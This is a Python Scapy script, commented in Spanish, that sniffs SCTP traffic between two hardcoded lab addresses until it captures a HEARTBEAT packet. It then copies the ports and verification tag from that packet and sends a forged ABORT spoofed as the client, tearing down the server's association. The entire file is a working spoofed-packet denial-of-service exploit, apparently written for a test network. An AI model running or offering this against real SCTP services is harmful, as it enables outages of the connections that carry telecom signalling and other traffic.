from scapy.all import *

# Constantes para las direcciones IP
IP_SRC = "10.10.10.7"  # Node Client
IP_DST = "10.10.10.155"  # Node Server

# Función para verificar HEARTBEAT
"""
La función isinstance() de Python tiene problemas con el sistema de
clases dinamicas de Scapy, por lo que lo más robusto es
inspeccionar el campo 'type' del chunk SCTP directamente.
"""

def is_heartbeat_packet(pkt: Packet) -> bool:
    if SCTP not in pkt:
        print("No SCTP layer")
        return False

    layer = pkt[SCTP].payload
    #print(f"First Chunk: {type(layer).__name__}")

    while isinstance(layer, Packet) and not isinstance(layer, NoPayload):
        print(f"   - Checking chunk type: {type(layer).__name__}")
        chunk_type = getattr(layer, "type", None)
        if chunk_type == 4:  # 4 = HEARTBEAT REQUEST
            #pkt.show()
            return True
        layer = layer.payload

    #print("No HEARTBEAT found")
    return False

def main():

    print(f"[*] Monitoring network for SCTP HEARTBEAT packet from {IP_SRC} to {IP_DST}...")
    packets = sniff(
        filter=f"sctp and src host {IP_SRC} and dst host {IP_DST}",
        lfilter=is_heartbeat_packet,
        count=1
    )

    # Extraer el paquete de la lista PacketList
    heartbeat_pkt = packets[0]

    # Extraer y mostrar datos relevantes
    src_ip = heartbeat_pkt[IP].src
    dst_ip = heartbeat_pkt[IP].dst
    src_port = heartbeat_pkt[SCTP].sport
    dst_port = heartbeat_pkt[SCTP].dport
    vtag = heartbeat_pkt[SCTP].tag

    print("\n[*] Captured HEARTBEAT packet details:")
    print(f"   - Source IP: {src_ip}")
    print(f"   - Destination IP: {dst_ip}")
    print(f"   - Source Port: {src_port}")
    print(f"   - Destination Port: {dst_port}")
    print(f"   - Verification Tag: {vtag:#010x}")

    # Construir el paquete ABORT con "Don't Fragment"
    abort_pkt = (
        IP(src=IP_SRC, dst=IP_DST, id=0x0000, flags="DF") /
        SCTP(sport=src_port, dport=dst_port, tag=vtag) /
        SCTPChunkAbort()
    )

    print("\n[*] ABORT packet parameters:")
    print(f"   - Source IP: {IP_SRC} (spoofed as Node Client)")
    print(f"   - Destination IP: {IP_DST} (Node Server)")
    print(f"   - Source Port: {src_port}")
    print(f"   - Destination Port: {dst_port}")
    print(f"   - Verification Tag: {vtag:#010x}")

    # Enviar el paquete ABORT
    print(f"\n[*] Sending ABORT packet to Node Server ({IP_DST})...")
    send(abort_pkt, verbose=False)
    print("   - ABORT packet sent.")


if __name__ == "__main__":
    main()